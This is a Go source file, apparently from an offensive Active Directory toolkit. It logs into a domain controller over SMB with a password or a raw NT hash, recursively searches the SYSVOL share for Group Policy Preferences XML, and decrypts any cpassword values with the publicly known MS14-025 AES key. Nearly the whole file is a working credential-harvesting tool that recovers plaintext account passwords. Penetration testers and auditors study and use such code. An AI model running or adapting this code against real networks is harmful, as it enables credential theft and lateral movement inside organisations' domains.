package credentials

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/xml"
	"fmt"
	"strings"
	"sync"
	"time"
	"unicode/utf16"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
	"github.com/zenazn/pkcs7pad"
)

// GPP XML structures

type gppUserProperties struct {
	Action    string `xml:"action,attr"`
	NewName   string `xml:"newName,attr"`
	UserName  string `xml:"userName,attr"`
	CPassword string `xml:"cpassword,attr"`
}

type gppUser struct {
	Properties gppUserProperties `xml:"Properties"`
}

type gppGroups struct {
	Users []gppUser `xml:"User"`
}

type gppTaskProperties struct {
	RunAs     string `xml:"runAs,attr"`
	CPassword string `xml:"cpassword,attr"`
}

type gppTask struct {
	Properties gppTaskProperties `xml:"Properties"`
}

type gppScheduledTasks struct {
	Tasks []gppTask `xml:"Task"`
}

// GPPEntry holds a single discovered credential
type GPPEntry struct {
	FilePath  string
	UserName  string
	NewName   string
	RunAs     string
	CPassword string
	Password  string
}

// aes key publicly disclosed by Microsoft (MS14-025)
var gppAESKey = []byte{
	0x4e, 0x99, 0x06, 0xe8, 0xfc, 0xb6, 0x6c, 0xc9,
	0xfa, 0xf4, 0x93, 0x10, 0x62, 0x0f, 0xfe, 0xe8,
	0xf4, 0x96, 0xe8, 0x06, 0xcc, 0x05, 0x79, 0x90,
	0x20, 0x9b, 0x09, 0xa4, 0x33, 0xb6, 0x6c, 0x1b,
}

func decryptCPassword(encStr string) string {
	pad := len(encStr) % 4
	if pad == 1 {
		encStr = encStr[:len(encStr)-1]
	} else if pad == 2 || pad == 3 {
		encStr += strings.Repeat("=", 4-pad)
	}

	ciphertext, err := base64.StdEncoding.DecodeString(encStr)
	if err != nil {
		return ""
	}

	block, err := aes.NewCipher(gppAESKey)
	if err != nil {
		return ""
	}

	if len(ciphertext)%aes.BlockSize != 0 {
		return ""
	}

	iv := make([]byte, aes.BlockSize)
	cipher.NewCBCDecrypter(block, iv).CryptBlocks(ciphertext, ciphertext)

	plaintext, err := pkcs7pad.Unpad(ciphertext)
	if err != nil {
		return ""
	}

	if len(plaintext)%2 != 0 {
		return ""
	}
	u16 := make([]uint16, len(plaintext)/2)
	if err := binary.Read(bytes.NewReader(plaintext), binary.LittleEndian, &u16); err != nil {
		return ""
	}
	return string(utf16.Decode(u16))
}

func extractCPasswords(filePath string, buf *bytes.Buffer) []GPPEntry {
	content := buf.String()
	var entries []GPPEntry

	if strings.Contains(content, "</ScheduledTasks>") {
		var tasks gppScheduledTasks
		if err := xml.NewDecoder(bytes.NewBufferString(content)).Decode(&tasks); err != nil {
			return nil
		}
		for _, t := range tasks.Tasks {
			if t.Properties.CPassword == "" {
				continue
			}
			entries = append(entries, GPPEntry{
				FilePath:  filePath,
				RunAs:     t.Properties.RunAs,
				CPassword: t.Properties.CPassword,
				Password:  decryptCPassword(t.Properties.CPassword),
			})
		}
	} else if strings.Contains(content, "</Groups>") {
		var groups gppGroups
		if err := xml.NewDecoder(bytes.NewBufferString(content)).Decode(&groups); err != nil {
			return nil
		}
		for _, u := range groups.Users {
			if u.Properties.CPassword == "" {
				continue
			}
			entries = append(entries, GPPEntry{
				FilePath:  filePath,
				UserName:  u.Properties.UserName,
				NewName:   u.Properties.NewName,
				CPassword: u.Properties.CPassword,
				Password:  decryptCPassword(u.Properties.CPassword),
			})
		}
	}

	return entries
}

func listAndCallback(session *smb.Connection, share, dir string, callback func(*smb.Connection, string, string)) {
	if err := session.TreeConnect(share); err != nil {
		return
	}
	defer session.TreeDisconnect(share)

	entries, err := session.ListDirectory(share, dir, "*")
	if err != nil {
		return
	}

	for _, entry := range entries {
		if entry.IsDir {
			listAndCallback(session, share, entry.FullPath, callback)
		} else {
			callback(session, share, entry.FullPath)
		}
	}
}

// FindGPPPasswords connects to the target via SMB, searches SYSVOL recursively
// for XML files containing GPP cpasswords, and returns decrypted credentials.
func FindGPPPasswords(host string, port int, domain, username, password, hash string) ([]GPPEntry, error) {
	initiator := &spnego.NTLMInitiator{
		User:   username,
		Domain: domain,
	}

	if hash != "" {
		// strip optional LM: prefix, keep NT part
		h := hash
		if idx := strings.LastIndex(h, ":"); idx != -1 {
			h = h[idx+1:]
		}
		hashBytes, err := hex.DecodeString(h)
		if err != nil {
			return nil, fmt.Errorf("invalid NT hash: %w", err)
		}
		initiator.Hash = hashBytes
	} else {
		initiator.Password = password
	}

	options := smb.Options{
		Host:        host,
		Port:        port,
		Initiator:   initiator,
		DialTimeout: time.Duration(5) * time.Second,
	}

	session, err := smb.NewConnection(options)
	if err != nil {
		return nil, fmt.Errorf("SMB connection failed: %w", err)
	}
	defer session.Close()

	var mu sync.Mutex
	var results []GPPEntry

	listAndCallback(session, "SYSVOL", "", func(conn *smb.Connection, share, path string) {
		ext := strings.ToLower(path)
		if !strings.HasSuffix(ext, ".xml") {
			return
		}

		buf := bytes.NewBuffer(nil)
		if err := conn.RetrieveFile(share, path, 0, buf.Write); err != nil {
			return
		}

		entries := extractCPasswords(path, buf)
		if len(entries) > 0 {
			mu.Lock()
			results = append(results, entries...)
			mu.Unlock()
		}
	})

	return results, nil
}
